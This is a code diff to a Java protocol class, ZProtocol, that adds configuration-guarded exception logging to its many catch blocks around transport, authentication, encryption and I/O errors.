@@ -63,6 +63,10 @@ public class ZProtocol extends Protocol {
 		try {
 			random = SecureRandom.getInstance(Messages.getString("6.1")); //$NON-NLS-1$
 		} catch (final NoSuchAlgorithmException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (ZProtocol): " + e); //$NON-NLS-1$
 			}
@@ -115,18 +119,30 @@ public class ZProtocol extends Protocol {
 			return true;
 
 		} catch (final TransportException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
 			
 			return false;
 		} catch (final ProtocolException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
 			
 			return false;
 		} catch (final CommandException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
@@ -353,7 +369,6 @@ public class ZProtocol extends Protocol {
 		}
 		final byte[] response = command(Proto.BYE);
 		parseEnd(response);
-
 	}
 
 	// **************** PROTOCOL **************** //
@@ -460,6 +475,10 @@ public class ZProtocol extends Protocol {
 			}
 
 		} catch (final CryptoException ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: parseAuthentication: " + ex); //$NON-NLS-1$
 			}
@@ -546,6 +565,10 @@ public class ZProtocol extends Protocol {
 				}
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 				}
@@ -660,8 +683,12 @@ public class ZProtocol extends Protocol {
 				}
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
+					Check.log(e); //$NON-NLS-1$
 				}
 				throw new ProtocolException();
 			}
@@ -721,6 +748,10 @@ public class ZProtocol extends Protocol {
 				return left > 0;
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 				}
@@ -785,6 +816,10 @@ public class ZProtocol extends Protocol {
 				return left > 0;
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 				}
@@ -833,6 +868,10 @@ public class ZProtocol extends Protocol {
 				}
 
 			} catch (final IOException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: parse error: " + e); //$NON-NLS-1$
 				}
@@ -995,6 +1034,10 @@ public class ZProtocol extends Protocol {
 			plainIn = cypheredWriteReadSha(plainOut);
 			return plainIn;
 		} catch (final CryptoException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: scommand: " + e); //$NON-NLS-1$
 			}
